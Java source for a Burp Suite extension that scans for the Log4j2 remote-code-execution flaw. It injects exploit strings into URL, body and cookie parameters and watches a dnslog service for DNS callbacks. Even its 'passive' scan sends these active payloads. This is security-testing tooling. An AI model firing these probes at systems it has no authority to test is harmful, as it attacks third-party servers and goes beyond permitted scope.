package burp.scanner;

import burp.*;
import burp.dnslog.IDnslog;
import burp.dnslog.platform.Ceye;
import burp.dnslog.platform.DnslogCN;
import burp.poc.IPOC;
import burp.poc.impl.POC2;
import burp.utils.ScanItem;
import burp.utils.Utils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Log4j2Scanner implements IScannerCheck {
    private BurpExtender parent;
    private IExtensionHelpers helper;
    private IDnslog dnslog;
    private IPOC poc;


    public Log4j2Scanner(final BurpExtender newParent) {
        this.parent = newParent;
        this.helper = newParent.helpers;
        this.poc = new POC2();
        this.dnslog = new DnslogCN();
        if (this.dnslog.getState()) {
            parent.stdout.println("Log4j2Scan loaded successfully!\r\n");
        } else {
            parent.stdout.println("Dnslog init failed!\r\n");
        }
    }

    public String urlencodeForTomcat(String exp) {
        exp = exp.replace("{", "%7b");
        exp = exp.replace("}", "%7d");
        return exp;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
        List<IScanIssue> issues = new ArrayList<>();
        Map<String, ScanItem> domainMap = new HashMap<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        parent.stdout.println(String.format("Scanning: %s", req.getUrl()));
        for (IParameter param :
                req.getParameters()) {
            try {
                String tmpDomain = dnslog.getNewDomain();
                byte[] tmpRawRequest = rawRequest;
                String exp = poc.generate(tmpDomain);
                boolean hasModify = false;
                switch (param.getType()) {
                    case IParameter.PARAM_URL:
                    case IParameter.PARAM_BODY:
                    case IParameter.PARAM_COOKIE:
                        exp = helper.urlEncode(exp);
                        exp = urlencodeForTomcat(exp);
                        IParameter newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                        tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                    case IParameter.PARAM_JSON:
                    case IParameter.PARAM_XML:
                    case IParameter.PARAM_MULTIPART_ATTR:
                    case IParameter.PARAM_XML_ATTR:
                        //unsupported.
                }
                if (hasModify) {
                    IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                    tmpReq.getResponse();
                    domainMap.put(tmpDomain, new ScanItem(param, tmpReq));

                }
            } catch (Exception ex) {
                parent.stdout.println(ex);
            }
        }
        try {
            Thread.sleep(2000); //sleep 2s, wait for network delay.
        } catch (InterruptedException e) {
            parent.stdout.println(e);
        }
        if (dnslog.flushCache()) {
            for (Map.Entry<String, ScanItem> domainItem :
                    domainMap.entrySet()) {
                ScanItem item = domainItem.getValue();
                boolean hasIssue = dnslog.CheckResult(domainItem.getKey());
                if (hasIssue) {
                    issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
                            req.getUrl(),
                            new IHttpRequestResponse[]{baseRequestResponse, item.TmpRequest},
                            "Log4j2 RCE Detected",
                            String.format("Vulnerable param is \"%s\" in %s.", item.Param.getName(), getTypeName(item.Param.getType())),
                            "High"));
                }
            }
        } else {
            parent.stdout.println("get dnslog result failed!\r\n");
        }
        parent.stdout.println(String.format("Scan complete: %s", req.getUrl()));
        return issues;
    }

    private String getTypeName(int typeId) {
        switch (typeId) {
            case IParameter.PARAM_URL:
                return "URL";
            case IParameter.PARAM_BODY:
                return "Body";
            case IParameter.PARAM_COOKIE:
                return "Cookie";
            case IParameter.PARAM_JSON:
                return "Body-json";
            case IParameter.PARAM_XML:
                return "Body-xml";
            case IParameter.PARAM_MULTIPART_ATTR:
                return "Body-multipart";
            case IParameter.PARAM_XML_ATTR:
                return "Body-xml-attr";
            default:
                return "unknown";
        }
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
}
